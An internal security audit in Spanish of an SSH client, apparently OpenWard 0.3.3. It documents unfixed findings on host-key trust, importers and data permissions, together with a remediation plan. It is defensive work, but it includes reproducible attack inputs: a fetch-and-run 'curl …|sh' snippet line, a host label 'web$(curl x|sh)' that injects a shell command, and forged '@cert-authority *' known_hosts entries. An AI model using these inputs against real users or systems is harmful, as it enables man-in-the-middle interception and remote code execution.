# Análisis de seguridad de la 0.3.3 y plan de remediación

- **Estado:** hallazgos documentados; remediación S0–S3 propuesta, sin empezar.
- **Fecha:** 2026-11-04.
- **Base:** 0.3.3-beta.2 (`b6b0012`), después de la [auditoría de la 0.3.1](auditoria-0.3.md) (R0–R6 y DT-7 hechos) y con los [registros de sesión](registros.md), que esa auditoría no vio. Los hallazgos llevan prefijos nuevos (CO, IM, DA, SF, RG, TE, CI) para no confundirlos con los de entonces (CX, DT, TM, UI, DS, BR).

> [!CAUTION]
> Este documento describe fallos **sin arreglar**, con lo necesario para reproducirlos. Mientras el repositorio sea privado no pasa nada; antes de hacerlo público, conviene haber cerrado al menos los de gravedad media (S0 y S1) o sacar este archivo del árbol que se publica.

## Objetivo

La auditoría de la 0.3.1 leyó el código entero buscando fallos de todo tipo. Esta mira solo la seguridad, y con un modelo de amenazas explícito, antes de dos cambios que la ponen a prueba: el repositorio pasa a ser público y la v0.4 cifra el vault. Comprueba también que los arreglos de seguridad de R1–R6 siguen en pie después de lo que se reescribió (DT-7 en el SFTP) y lo que se añadió (los registros de sesión).

**Modelo de amenazas:**
- un **servidor SSH hostil**, o un salto comprometido: controla la clave que presenta, los nombres, tipos, permisos y contenido del SFTP, y todo lo que sale en el terminal;
- un **atacante en la red** (MITM), que puede presentar cualquier clave o certificado de host;
- un **archivo importado hostil**: un export de PuTTY, MobaXterm, SecureCRT, Tabby, Termius o un CSV que alguien pasa, o un `ssh_config` que trae un paquete;
- **otros usuarios de la misma máquina**, sin privilegios: carpetas compartidas, `/tmp`, `C:\ProgramData`, permisos de la carpeta de datos;
- la **cadena de suministro y la CI**: descargas en el build, acciones, cachés, PRs de forks cuando el repositorio sea público.

Fuera de alcance, por conocido y documentado: el vault y los registros sin cifrar hasta la v0.4 (SECURITY.md), la firma y la notarización (ARCHITECTURE §15) y el aviso de `rsa` (RUSTSEC-2023-0071, razonado en `core/deny.toml`).

## Cómo se hizo

- Seis revisiones de solo lectura, que cubren siete áreas (terminal e importadores fueron juntos): confianza en el host y conexión (`openward-ssh`, `openward-app`, `openward-proto`), datos en reposo y claves (`openward-vault`, `keychain`, FFI), SFTP y terminal local (`openward-sftp`, `openward-pty`), registros e historial (`openward-app::logs`, `app/lib/logs`, `app/lib/history`), terminal (`openward-ghostty`, `openward-term`, `app/lib/terminal`), importadores (`openward-import`) y build, CI y cadena de suministro.
- Cada hallazgo apunta a un archivo y una línea y dice quién lo aprovecha y qué consigue. Los de gravedad media se han vuelto a comprobar a mano sobre el código (CO-2 y CI-2 dependen de algo que no se ve en él y llevan «Probable»). Nueve tienen además una prueba que se ejecutó: CO-1, CO-4, IM-5, IM-6, DA-2, DA-3, RG-4, RG-6 y CI-4. Las pruebas se hicieron fuera del repositorio y no se incluyen.
- **Dependencias:** `cargo audit` 0.22.2 (advisory-db del 2026-11-03) sobre los cuatro `Cargo.lock`, y los 141 paquetes de `app/pubspec.lock` y del build tool de cargokit contra [OSV](https://osv.dev).
- **Secretos:** un clon espejo con todas las refs (143 commits, ramas, `refs/pull/*`, notas y 25 tags), y los 2457 blobs del historial buscando claves privadas, tokens (`ghp_`, `github_pat_`, `AKIA`, `xox`, `sk-`), `.env`, certificados y datos reales. Los vaults de `openward-vault/tests/fixtures` se abrieron con `sqlite3`.
- **Gravedad:** *Crítica* (se aprovecha sin hacer nada el usuario y da el control), *Alta* (sin aviso y con impacto serio, en una configuración normal), *Media* (impacto serio con una condición previa: un archivo importado, una carpeta compartida, una plataforma), *Baja* (impacto limitado o varias condiciones), *Informativa* (defensa en profundidad o comportamiento que conviene saber).
- **Confianza:** *Confirmado* (la ruta de código seguida entera, o una prueba ejecutada) o *Probable* (falta algo que no se ve en el código; se dice qué).

## Resumen

**Lo que está bien hecho**, y conviene no romper:
- **La confianza en el host se decide bien.** La clave se verifica antes de mandar nada de la autenticación, cada salto por separado y con su propio nombre; `Changed`, `Revoked` y un certificado inválido nunca se aceptan; cada respuesta de la interfaz va a su pregunta por un id; una reconexión vuelve a verificar. russh 0.64.1 negocia sin `none`, CBC, MAC SHA-1 ni grupo 1, y con strict KEX.
- **El terminal es seguro de serie.** libghostty-vt no devuelve nada que controle el servidor (sin informe del título, DECRQCRA, OSC 52, 1337 ni notificaciones); el pegado cambia los controles por espacios, así que `ESC[201~` no cierra el pegado entre corchetes; los enlaces se abren solo con ⌘ o Ctrl y con lista de esquemas; el `unsafe` de `openward-ghostty` y `openward-pty` es correcto.
- **Los arreglos de R1 siguen en pie** en las rutas nuevas: DT-1 en el recorrido concurrente del SFTP, DT-2 y DT-8; CX-4 cubre también los metacaracteres de `cmd.exe`.
- **Los registros de sesión cumplen su promesa principal:** solo graban la salida, nunca lo que se teclea; la carpeta es fija, 0700, y los archivos nacen 0600; la FFI busca los ids en un mapa, sin rutas; el reproductor tira las respuestas del terminal.
- **La cadena de suministro de la CI:** todas las acciones fijadas por SHA (y los SHA coinciden con sus tags), sin `pull_request_target`, permisos `contents: read` salvo en `release`, Zig verificado por SHA-256, Ghostty por commit y sus dependencias por hash, ningún binario precompilado de cargokit.
- **Ningún secreto real** en el árbol ni en el historial, y los fixtures solo tienen datos inventados.
- **Dependencias:** ningún aviso abierto en `core/Cargo.lock` ni en los paquetes de Dart (solo un crate *yanked*, CI-9).

**Lo que más pesa:**
- **Lo que se importa decide en qué hosts se confía y qué se abre al conectar.** Un dato de Termius preparado convierte una clave en `@cert-authority *` y salta el arreglo de CX-3 (CO-1); un export de PuTTY, SecureCRT o Tabby abre al conectar un SOCKS en `0.0.0.0` o un túnel remoto hacia un servicio local (IM-1), y trae el reenvío del agente sin decirlo (IM-2). La vista previa solo enseña números. Es la misma clase de riesgo que el ProxyCommand importado que R1 ya desactivó.
- **Los permisos en disco dependen de quién crea la carpeta.** En Linux la carpeta de datos la crea `path_provider` en 0755 y `history.json`, `recent.json` y `settings.json` salen en 0644, aunque la interfaz diga que solo los lee tu usuario (DA-1).
- **El SFTP sigue enlaces locales al bajar** (SF-1): en una carpeta compartida, otro usuario hace que la bajada escriba donde quiera dentro del home de la víctima.
- **Los paquetes de Linux que se publican se construyen con un Zig sin verificar** (CI-1), y cuando el repositorio sea público la puerta seguirá siendo `make ci` en la máquina que publica (CI-2).

**Hallazgos por área y gravedad:**

| Área | Crítico | Alto | Medio | Bajo | Inform. | Total |
|---|---|---|---|---|---|---|
| CO · Confianza en el host y conexión | | | 2 | 6 | 1 | 9 |
| IM · Importadores | | | 1 | 5 | 1 | 7 |
| DA · Datos en reposo, claves y secretos | | | 1 | 5 | 3 | 9 |
| SF · SFTP y archivos locales | | | 1 | 10 | 1 | 12 |
| RG · Registros de sesión e historial | | | | 8 | 1 | 9 |
| TE · Terminal | | | | 1 | 4 | 5 |
| CI · Build, CI y cadena de suministro | | | 2 | 9 | 1 | 12 |
| **Total** | **0** | **0** | **7** | **44** | **12** | **63** |

## Hitos

### S0 · Antes de hacer público el repositorio (2–3 días)

Lo que cambia en cuanto cualquiera puede abrir un PR o leer el historial.
- **CI-2:** la puerta de los PRs de fuera pasa a ser GitHub Actions (gratis en un repositorio público), con aprobación para los colaboradores externos; `make ci` nunca con código sin revisar en la máquina de release.
- **CI-3:** el reporte privado de vulnerabilidades, activado el mismo día, y un correo alternativo en SECURITY.md.
- **CI-4, CI-5:** el tag validado y fuera del programa de `sed`; `release` con todos los jobs, el tag en `main`, un `environment` con revisores y `persist-credentials: false`.
- **CI-9:** `cargo update -p crypto-bigint` y `make deny` en verde.
- **CI-8, CI-10:** sin `env` en `build_pod.sh`; sin paquetes con nombre de release en los PRs.
- Decidir qué hacer con el correo personal del historial (CI-12) y con este documento.

**Puerta:** un PR de un fork corre en Actions sin tocar la máquina de release; `make deny` en verde; SECURITY.md da un canal que funciona desde fuera.

### S1 · Seguridad (0.3.3-beta.3, ~1,5 semanas)

Los siete de gravedad media que quedan y los bajos que van con ellos.
- **Importar sin confiar de más:** `KnownHost` rechaza `hosts` que empiezan por `@` y claves que no se leen, y el vault construye las entradas por sus campos, no por texto (CO-1); las CA, los comodines y `@revoked` importados, a la vista y desmarcados, y solo los de los hosts elegidos. Los túneles importados sin `autostart`, en loopback y a la vista (IM-1); el reenvío del agente, desmarcado (IM-2); el ProxyCommand de un `ssh_config` que no es el tuyo, como los de otros programas (IM-3).
- **Permisos:** `create_private_dir` pone 0700 también a una carpeta que ya es tuya; historial, recientes y ajustes en 0600; `vault.db` endurecido al abrir; el texto de Ajustes, cierto (DA-1). La copia de `VACUUM INTO` nace 0600 (DA-2).
- **SFTP local:** el `.part` con `O_NOFOLLOW` (y `O_EXCL` si no se reanuda), permisos y fecha sobre el descriptor, carpetas que son enlaces rechazadas o preguntadas (SF-1); el modo real del destino de un enlace (SF-2).
- **Windows:** el `known_hosts` de `%PROGRAMDATA%` solo si es de Administrators o SYSTEM (CO-2).
- **Pequeños con efecto:** el espacio inicial también en una línea editada (RG-1); una sola línea en `authorized_keys` (DA-3); `{{host}}` y `{{address}}` citados para la shell (DA-4).

**Puerta:**
- pruebas nuevas: la entrada de CO-1 se rechaza; un dato de Termius con `@cert-authority *` no llega activo; un `D0.0.0.0:1080` de PuTTY llega desactivado y en loopback; con la carpeta de datos creada antes en 0755, queda 0700 y `history.json` en 0600; un `.part` que es un enlace hace fallar la bajada sin tocar su destino; un `.pub` con dos líneas no instala dos;
- `make ci` en verde y la beta en el tap.

### S2 · Antes de D3 y D6 de la v0.4 (~2 semanas)

Lo que el vault cifrado necesita resuelto, y los bajos de cada área.
- **Antes de D3 (migración):** la copia previa se borra o se cifra tras migrar bien (DA-2).
- **Antes de D6 (secretos):** `Zeroizing` en la clave de Termius, en `generate_key` e `import_key`, y contar las contraseñas de Termius sin descifrarlas (DA-5).
- **Confianza en el host:** el algoritmo de la firma, el negociado (CO-3); ECDSA normalizado (CO-4); confiar en la nueva retira la vieja (CO-5); las claves aceptadas que no se guardan se recuerdan (CO-6); el agente solo en las conexiones del terminal (CO-7); la tarjeta del servidor no se parece a una local (CO-8).
- **SFTP:** SF-3 a SF-11, sobre todo los límites (SF-11) y los bits especiales (SF-4, SF-9).
- **Registros:** RG-2 a RG-8; sobre todo el tope por sesión frente a la retención (RG-3) y exportar en streaming (RG-4).
- **Importadores:** presupuestos de memoria en Termius (IM-5) y de archivos en `Include` (IM-6); snippets importados a la vista (IM-4).
- **Build:** CI-1, CI-6, CI-7 y CI-11.

### S3 · Informativos (repartidos)

CO-9, IM-7, DA-7 a DA-9, SF-12, RG-9, TE-1 a TE-5 y CI-12, cuando se toque su código.

---

## CO · Confianza en el host y conexión

### CO-1 · Un known host importado puede ser `@cert-authority *` (CX-3 incompleto)
- **Gravedad:** Media · **Confianza:** Confirmado (prueba ejecutada)
- **Ubicación:** `core/crates/openward-proto/src/lib.rs:437-469` (`is_well_formed`, `to_line`); `core/crates/openward-vault/src/lib.rs:722-733` (`known_hosts_text`); `core/crates/openward-import/src/termius/model.rs:462-478`; `core/crates/openward-app/src/programs.rs:783-813`; `core/crates/openward-app/src/connect.rs:226`; `app/lib/import/program_preview.dart:181,228-231`.
- **Qué pasa:** el vault convierte cada `KnownHost` en una línea de texto y la vuelve a leer. `is_well_formed` solo exige que los patrones y las dos partes de la clave no tengan espacios ni controles, así que `hosts = "@cert-authority"`, `key = "* ssh-ed25519"`, `comment = "<base64 de una CA>"` pasa la comprobación y `to_line()` da `@cert-authority * ssh-ed25519 AAAA…`. La prueba devuelve `Certified` para `bank.example.com` con un certificado de esa CA, aunque el host tiene otra clave conocida. Hay dos caminos aún más directos por el mismo importador: el `marker` de Termius se importa tal cual (`@cert-authority` con `hostnames = "*"`), y una entrada normal con `*` hace que cualquier clave del atacante sea `Known` (`known_hosts.rs:268-270`). Todos los known hosts del bundle entran aunque el usuario elija solo algunos hosts, y la vista previa solo dice cuántos son.
- **Escenario:** alguien pasa a un usuario de Termius una carpeta de datos preparada («mis hosts»), o mete las entradas en un vault compartido de Termius. Tras importarla, el atacante en la red presenta un certificado de su CA para cualquier host: la conexión sale sin aviso y la contraseña o el 2FA le llegan a él. Con `@revoked` puede además impedir conectar a hosts legítimos.
- **Recomendación:** construir las entradas de `openward-ssh` desde los campos, sin pasar por texto; rechazar `hosts` que empiecen por `@` y claves que no se lean; en los importadores, las CA, los comodines y `@revoked` a la vista y desmarcados; importar solo los known hosts de los hosts elegidos.
- **Relación:** CX-3 arregló el comentario con saltos de línea, no los demás campos.

### CO-2 · Windows: `%PROGRAMDATA%\ssh\ssh_known_hosts` se lee sin mirar de quién es
- **Gravedad:** Media · **Confianza:** Probable (falta comprobar las ACL en una instalación real)
- **Ubicación:** `core/crates/openward-app/src/local.rs:40-47`; `core/crates/openward-app/src/plan.rs:243-247`; `core/crates/openward-app/src/connect.rs:164-175`.
- **Qué pasa:** en Windows, el `known_hosts` global se busca en `C:\ProgramData\ssh` y se lee sin comprobar dueño ni ACL. Por defecto, un usuario estándar puede crear subcarpetas en `C:\ProgramData` y queda como su dueño; sin el servidor OpenSSH instalado, `ssh` no existe.
- **Escenario:** en un Windows compartido, otro usuario sin privilegios crea `C:\ProgramData\ssh\ssh_known_hosts` con `* ssh-ed25519 <su clave>` o `@cert-authority * <su CA>`, y desde la misma red hace MITM sin aviso a las conexiones de los demás; con `@revoked *` les impide conectar.
- **Recomendación:** leer el archivo global solo si la carpeta y el archivo son de Administrators o SYSTEM y Users no puede escribir en ellos; si no, avisar y no leerlo.
- **Relación:** CX-5 añadió esta fuente.

### CO-3 · Se aceptan firmas `ssh-rsa` (SHA-1) con `legacy_host_keys` desactivado (CX-13 incompleto)
- **Gravedad:** Baja · **Confianza:** Confirmado (leído en russh 0.64.1 y ssh-key)
- **Ubicación:** `core/crates/openward-ssh/src/client.rs:519-532,557`; `core/crates/openward-ssh/src/known_hosts.rs:312-320`; russh `src/client/kex.rs:329-341`.
- **Qué pasa:** R1 quitó `ssh-rsa` de la negociación, pero russh verifica la firma del intercambio con el algoritmo que dice la propia firma, sin compararlo con el negociado, y ssh-key (con `sha1`, que activa russh) acepta RSA con SHA-1. Lo mismo con la firma de la CA de un certificado de host, que OpenSSH rechaza desde la 8.2.
- **Recomendación:** en `check_server_key`, exigir que el algoritmo de la firma sea el negociado; en `check_certificate`, rechazar las firmas `ssh-rsa` salvo con la opción heredada.

### CO-4 · Una clave ECDSA con el punto comprimido escapa de `@revoked`
- **Gravedad:** Baja · **Confianza:** Confirmado (prueba ejecutada)
- **Ubicación:** `core/crates/openward-ssh/src/known_hosts.rs:248-252,260,269`.
- **Qué pasa:** la revocación y la coincidencia comparan los bytes de la clave; ssh-key acepta puntos SEC1 comprimidos y la firma se verifica igual. OpenSSH compara los puntos. La misma clave revocada, enviada comprimida, sale `Unknown`: con «Aceptar nuevas» se acepta sola.
- **Escenario:** una clave de host ECDSA filtrada y revocada con `@revoked *` vuelve a valer contra hosts que la víctima aún no conoce.
- **Recomendación:** normalizar las claves ECDSA a la forma sin comprimir antes de comparar, o rechazar los puntos comprimidos.

### CO-5 · «Confiar en la clave nueva» no deja de confiar en la vieja
- **Gravedad:** Baja · **Confianza:** Confirmado
- **Ubicación:** `core/crates/openward-vault/src/lib.rs:744-751,933-939`; `core/crates/openward-ssh/src/known_hosts.rs:268-270`; `core/crates/openward-app/src/lib.rs:553-555`; `app/lib/tabs/connection_panels.dart:512,556-563`.
- **Qué pasa:** solo se sustituyen las entradas cuyo patrón es exactamente igual, con las mismas mayúsculas; la comprobación pasa todo a minúsculas y da `Known` con cualquier clave listada. Siguen valiendo las entradas con otras mayúsculas, con varios patrones (`web,10.0.0.5`), con hash y las de `~/.ssh/known_hosts`.
- **Escenario:** la clave del servidor se rota porque se filtró; el usuario confía en la nueva, y quien tiene la vieja sigue pudiendo hacer MITM sin aviso.
- **Recomendación:** al confiar en la nueva, retirar toda clave del mismo tipo que coincida con host:puerto (con patrones y hash); una vieja que siga en `~/.ssh/known_hosts`, tratarla como `Changed` o decirlo en el diálogo.

### CO-6 · Si la clave aceptada no se guarda, «Aceptar nuevas» acepta cualquiera al reconectar
- **Gravedad:** Baja · **Confianza:** Confirmado (lectura de código)
- **Ubicación:** `core/crates/openward-app/src/connect.rs:291-295`; `core/crates/openward-vault/src/lib.rs:759-761`; `core/crates/openward-app/src/lib.rs:172-205`.
- **Qué pasa:** un fallo al guardar se ignora («trusted for this session»), pero cada reconexión automática (hasta ocho) vuelve a leer el vault: con `AcceptNew` el host sale otra vez `Unknown` y se acepta otra clave sin preguntar. Pasa con un error de SQLite (disco lleno) o con una dirección que `is_well_formed` rechaza.
- **Recomendación:** recordar en memoria, por `App`, las claves aceptadas; si no se pudo guardar, no aceptar sola la siguiente y avisar.

### CO-7 · El canal del agente se acepta en conexiones que nunca lo pidieron
- **Gravedad:** Baja · **Confianza:** Confirmado
- **Ubicación:** `core/crates/openward-app/src/connect.rs:230-234`; `core/crates/openward-ssh/src/client.rs:344-361`; `core/crates/openward-app/src/sftp.rs:245-249`.
- **Qué pasa:** con `ForwardAgent`, toda conexión del host acepta `auth-agent@openssh.com`, también las del navegador SFTP y las de un túnel, que nunca piden el reenvío. El servidor puede firmar con el agente del usuario cuando quiera. `sftp` de OpenSSH pasa `-oForwardAgent=no`.
- **Recomendación:** activarlo solo en las conexiones del terminal, o aceptar el canal solo después de haberlo pedido.

### CO-8 · La tarjeta keyboard-interactive puede imitar una pregunta local
- **Gravedad:** Baja · **Confianza:** Probable (depende de que el usuario se confunda)
- **Ubicación:** `app/lib/tabs/prompt_card.dart:62-69,155-171`; `core/crates/openward-app/src/connect.rs:575-585`.
- **Qué pasa:** el título es el `name` que manda el servidor y el cuerpo, sus `instructions`. Un servidor ya aceptado puede imitar la tarjeta de «Frase de paso» y pedir la de una clave local; solo lo delata la línea `usuario@host`. Pasará igual con la contraseña del vault de la v0.4 si usa una tarjeta parecida.
- **Recomendación:** «Lo pide el servidor X», con otro estilo, y el `name` del servidor nunca como título.

### CO-9 · Informativos de la conexión
- **Gravedad:** Informativa
- Los canales que el servidor abre sin pedirse (`x11`, `session`, `direct-tcpip`, `direct-streamlocal`, `forwarded-streamlocal`) los aceptan los manejadores por defecto de russh y luego se tiran (`client.rs:227-362`): no conectan con nada local, pero conviene rechazarlos. Los certificados de host con opciones críticas no se rechazan, y OpenSSH sí.
- Heredados de OpenSSH: Terrapin sigue siendo posible con servidores sin strict KEX y ChaCha20 o ETM; los túneles locales en loopback los puede usar cualquier otro usuario o proceso local; las credenciales del proxy HTTP (Basic) y SOCKS5 van en claro; sin `IdentitiesOnly`, las claves del agente se ofrecen a todos los saltos (`connect.rs:431-443`).
- La petición `CONNECT` del proxy HTTP se construye con la dirección sin rechazar CR o LF (`proxy.rs:91-100`; el vault solo exige que no esté vacía): los corchetes que añade la hacen poco aprovechable, pero conviene validarla.

## IM · Importadores

### IM-1 · Los túneles importados se abren solos al conectar, también en `0.0.0.0`
- **Gravedad:** Media · **Confianza:** Confirmado
- **Ubicación:** `core/crates/openward-import/src/putty.rs:325-339,410-433`; `core/crates/openward-import/src/securecrt.rs:363-392`; `core/crates/openward-import/src/tabby.rs:228-251`; `core/crates/openward-app/src/programs.rs:739-767`; `core/crates/openward-app/src/connect.rs:75-88`; `core/crates/openward-app/src/tunnels.rs:156-166`; `core/crates/openward-ssh/src/forward.rs:93,145`; `app/lib/import/program_preview.dart:224-225,331`.
- **Qué pasa:** PuTTY, SecureCRT y Tabby traen sus túneles con `autostart: true` y con la dirección de escucha del archivo (`LocalPortAcceptAll` de PuTTY pasa a `0.0.0.0`); `listen_address` la respeta, `*` incluido, y `autostart` los abre en cuanto conecta. El SOCKS5 no tiene autenticación. La vista previa solo dice cuántos túneles hay.
- **Escenario:**
  - un export con `D1080` y `LocalPortAcceptAll=1` en el host del bastión: al conectar desde una wifi pública, cualquiera de esa red usa un SOCKS5 abierto hacia la red interna, autenticado como la víctima;
  - un `R6379=127.0.0.1:6379` (o hacia cualquier servicio local sin autenticar: Redis, una API de desarrollo, Jupyter): el servidor llega a ese servicio del equipo del usuario, y desde algunos de ellos a ejecutar código.
- **Recomendación:** importar los túneles de otros programas sin `autostart`; los que no escuchan en loopback, a la vista en la vista previa y en la lista de túneles, y confirmados al abrirlos. El mismo criterio que CX-4 con el ProxyCommand.

### IM-2 · El reenvío del agente de otros programas llega activo y sin aviso
- **Gravedad:** Baja · **Confianza:** Confirmado
- **Ubicación:** `putty.rs:244-246`; `mobaxterm.rs:186-188`; `securecrt.rs:308-310`; `tabby.rs:194-196`; `termius/model.rs:302-304` (todos en `core/crates/openward-import/src/`).
- **Escenario:** un export trae «prod-db» con la dirección del atacante y `AgentFwd=1`; mientras dure la sesión, el servidor firma con el agente del usuario contra GitHub o el bastión.
- **Recomendación:** un aviso en el informe y una casilla en la vista previa, desmarcada para lo que venga de otro programa.

### IM-3 · El ProxyCommand de un `ssh_config` ajeno llega activo y no se ve
- **Gravedad:** Baja · **Confianza:** Confirmado
- **Ubicación:** `core/crates/openward-import/src/ssh_config.rs:508-509,789`; `core/crates/openward-app/src/import.rs:39-51`.
- **Qué pasa:** el de `~/.ssh/config` debe llegar activo, como en `ssh`. Pero el importador acepta también un archivo elegido (`file: Some(path)`), que puede venir de otra persona, y su ProxyCommand llega igual de activo; la vista previa no lo enseña.
- **Recomendación:** si el archivo no es `~/.ssh/config` (o algo que incluye), tratarlo como los de otros programas: al informe, con su texto.
- **Relación:** CX-4.

### IM-4 · Los snippets importados entran todos, sin verse, y la paleta solo enseña la primera línea
- **Gravedad:** Baja · **Confianza:** Confirmado
- **Ubicación:** `core/crates/openward-app/src/programs.rs:771-782`; `core/crates/openward-import/src/termius/model.rs:450-459`; `app/lib/palette/command_palette.dart:506-516`; `app/lib/snippets/snippets.dart:100-107`.
- **Escenario:** un snippet «Uso de disco» con `df -h` en la primera línea y `curl …|sh` en la tercera; desde ⌘K, Intro lo manda entero, cada línea con su Intro.
- **Recomendación:** elegir los snippets en la vista previa, con el texto entero; «N líneas» en la paleta; confirmar la primera vez que se lanza uno importado.

### IM-5 · Una carpeta de Termius preparada agota la memoria (DT-14 incompleto)
- **Gravedad:** Baja (la app se cae) · **Confianza:** Confirmado (prueba ejecutada)
- **Ubicación:** `core/crates/openward-import/src/termius/v8.rs:143-148,177-191,242-245`; `core/crates/openward-import/src/termius/leveldb.rs:210-214,254-266`; se llega por `termius/mod.rs:91-92`, antes de pedir el llavero.
- **Qué pasa:**

  | Entrada | Tamaño | Resultado |
  |---|---|---|
  | Referencias `^` de V8, 22 niveles (cada una copia el objeto entero) | 305 B | 16,7 M valores en 17 s; cada nivel dobla |
  | Arrays dispersos `'a'` (reservan 65 536 huecos sin mirar los datos) | 9 KB | unos 2 GiB |
  | LevelDB con una clave compartida enorme (se clona en cada entrada) | 85 KB | 259 MB de pico |

  Con 40 niveles o una clave de 1 MiB, la app se queda sin memoria. proptest con bytes al azar no da con ellos.
- **Recomendación:** un presupuesto de valores por registro (como el `MAX_NODES` de Tabby) que cuente lo que expande cada referencia; arrays dispersos según sus propiedades reales; en LevelDB, un tope de bytes por tabla o sin clonar las claves; los tres casos en `tests/hostile.rs`.

### IM-6 · `Include` sin tope de trabajo: abanico exponencial y `**`
- **Gravedad:** Baja (la app se cuelga) · **Confianza:** Confirmado (prueba ejecutada)
- **Ubicación:** `core/crates/openward-import/src/ssh_config.rs:440-449,716-730`; `app/lib/welcome/first_run.dart:49-52`; `core/crates/openward-app/src/connect.rs:166-172`.
- **Qué pasa:** solo se cuenta la profundidad (16). `Include config config` lee 2^16 archivos (2,7 s y 65 536 avisos); con tres, 3^16 (más de un minuto, sin acabar). `Include /**/*` lee como configuración cada archivo del disco de hasta 64 MiB: el crate `glob` admite `**`, glob(3) de OpenSSH no. Se dispara al importar y en la bienvenida, con cualquier archivo que una herramienta deje en `~/.ssh/config.d/`. Aparte, `UserKnownHostsFile` se lee al conectar con `read_to_string`, sin tope ni tipo: `/dev/zero` agota la memoria.
- **Recomendación:** un tope de archivos leídos (unos 256), no releer un archivo de la misma cadena, `**` como `*`, y `files::read` (archivo normal y 64 MiB) para los `known_hosts`.

### IM-7 · El consentimiento de Termius
- **Gravedad:** Informativa · **Confianza:** Confirmado
- **Ubicación:** `app/lib/import/programs.dart:38`; `core/crates/openward-import/src/detect.rs:135-140`; `core/crates/openward-import/src/termius/keychain.rs:80-87`.
- **Qué pasa:** el diálogo solo sale cuando Termius se detecta solo; soltando su carpeta a mano se lee el llavero sin él. En Linux (`secret-tool`) y Windows el sistema no pregunta, aunque `termius_consent.dart` dice que sí.
- **Recomendación:** el diálogo siempre que `detect` reconozca Termius, y el texto según la plataforma.

## DA · Datos en reposo, claves y secretos

### DA-1 · En Linux, la carpeta de datos no es privada y el historial sale en 0644
- **Gravedad:** Media · **Confianza:** Confirmado en el código (path_provider_linux 2.2.2 incluido); la exposición depende de los permisos del home
- **Ubicación:** `app/lib/main.dart:24-26`; `core/crates/openward-app/src/lib.rs:857-871` (`create_private_dir`); `app/lib/core/json_file.dart:28-33` (`writeFileAtomically`); `app/lib/history/history.dart:155`; `app/lib/home/recent.dart:204`; `app/lib/core/settings.dart:469`; `core/crates/openward-vault/src/store.rs:100`; `app/lib/l10n/app_es.arb:2166`.
- **Qué pasa:**
  - `getApplicationSupportDirectory()` crea `~/.local/share/dev.openward.OpenWard` con `Directory.create` (0777 menos la umask, normalmente 0755) antes de llamar al núcleo, y `create_private_dir` vuelve sin hacer nada si la carpeta ya existe: nunca queda en 0700;
  - `writeFileAtomically` crea el temporal con los permisos por defecto de Dart: `history.json` (activado de serie, hasta 2000 comandos con dónde se ejecutaron), `recent.json` y `settings.json` salen en 0644, y un `chmod 600` a mano se pierde en el siguiente guardado;
  - el núcleo sí protege lo suyo (`vault.db`, `-wal`, `-shm` y el candado en 0600; `logs/` en 0700), pero un `vault.db` que ya existiera con otros permisos no se endurece;
  - Ajustes › Registros dice «en una carpeta que solo puede leer tu usuario, igual que el historial de comandos», que no es cierto para el historial.
- **Escenario:**
  - un equipo compartido con homes en 0755 (Ubuntu 20.04 y anteriores, laboratorios, homes por NFS): otro usuario lee `history.json` y encuentra `mysql -pSecreto…` o `export TOKEN=…`;
  - con umask 002 y un grupo con más miembros, la carpeta queda escribible para el grupo: otro usuario sustituye `vault.db` por uno con un ProxyCommand y ejecuta órdenes como la víctima al conectar.
  - En macOS (`~/Library` en 0700) y Windows (ACL de `%APPDATA%`) no hay exposición.
- **Recomendación:** `create_private_dir` pone 0700 a una carpeta que existe y es del usuario; los JSON se escriben con 0600 (por la FFI, o con un `chmod` del temporal antes de escribir); `vault.db` a 0600 al abrir; una prueba con la carpeta ya creada; el texto de Ajustes, cierto.
- **Relación:** UI-6 (los archivos atómicos de R1) se hizo sin los permisos.

### DA-2 · La copia previa a una migración queda en 0644 y para siempre
- **Gravedad:** Baja hoy (`STEPS` está vacío); Media con la primera migración real (D3) · **Confianza:** Confirmado (prueba ejecutada)
- **Ubicación:** `core/crates/openward-vault/src/store.rs:55-77`.
- **Qué pasa:** SQLite crea el destino de `VACUUM INTO` con los permisos por defecto, no con los de `vault.db`, y nada borra `vault.sqlite.format-N.bak`. Con D3 quedaría junto al vault cifrado una copia entera en claro.
- **Recomendación:** crear antes el archivo vacío con `create_new` y 0600 (SQLite acepta un destino vacío); en D3, borrar o cifrar la copia tras migrar bien, o avisar.
- **Relación:** DT-11.

### DA-3 · Instalar una clave pública puede añadir más de una línea a `authorized_keys`
- **Gravedad:** Baja · **Confianza:** Confirmado (prueba ejecutada)
- **Ubicación:** `core/crates/openward-app/src/keychain.rs:447-455,499-536`; `core/crates/openward-app/src/programs.rs:857-869`; `core/crates/openward-app/src/sftp.rs:149-165`.
- **Qué pasa:** ssh-key toma como comentario todo lo que va tras el base64, saltos de línea incluidos, y lo vuelve a escribir igual. Un `.pub` de dos líneas, o una clave importada con `deploy\nssh-ed25519 AAAA<otra> x` como comentario, instala esas líneas de más; `with_authorized` solo mira la primera.
- **Escenario:** alguien entrega una clave «de despliegue» con la suya escondida en el comentario; el usuario la instala, y cuando más tarde la quita creyendo revocar el acceso, la escondida sigue.
- **Recomendación:** limpiar los comentarios de controles al importar y al escribir el `.pub`, y exigir en `install_public_key` exactamente una línea `tipo base64 [comentario]`.

### DA-4 · Las variables automáticas de los snippets se sustituyen sin citar
- **Gravedad:** Baja · **Confianza:** Confirmado
- **Ubicación:** `core/crates/openward-app/src/snippets.rs:84-100`; `app/lib/snippets/snippets.dart:57,91,104-106`.
- **Qué pasa:** `{{host}}` (la etiqueta de la pestaña) y `{{address}}` entran tal cual en la orden, y sin variables que preguntar y con un solo panel se mandan con su Intro sin vista previa. Ningún importador limpia las etiquetas.
- **Escenario:** un CSV o un Tabby importado trae un host con la etiqueta `web$(curl x|sh)`; un snippet `ping {{host}}` en ese host ejecuta lo que va dentro, en el servidor.
- **Recomendación:** citar para la shell los valores automáticos (o enseñar siempre la vista previa cuando haya alguno), y quitar los controles de etiquetas y direcciones al importar.

### DA-5 · Borrado incompleto de secretos en memoria (CX-11 incompleto)
- **Gravedad:** Baja · **Confianza:** Confirmado
- **Ubicación:** `core/crates/openward-import/src/termius/keychain.rs:42,58,85`; `termius/crypto.rs:34-45`; `termius/model.rs:67-72,143-160,256`; `core/crates/openward-ffi/src/api/keychain.rs:113-141`; `core/crates/openward-app/src/keychain.rs:435,455`.
- **Qué pasa:** la clave maestra de Termius y lo que descifra van en `String` y `Vec` normales; las **contraseñas** de Termius se descifran solo para contarlas; `generate_key` (con la frase de paso) e `import_key` (con la clave privada) no usan `Zeroizing`, aunque `change_key_passphrase` sí.
- **Recomendación:** contar las contraseñas sin descifrarlas; `Zeroizing` en `decrypt`, en la clave maestra y en la FFI. Es la base de los secretos de D6.

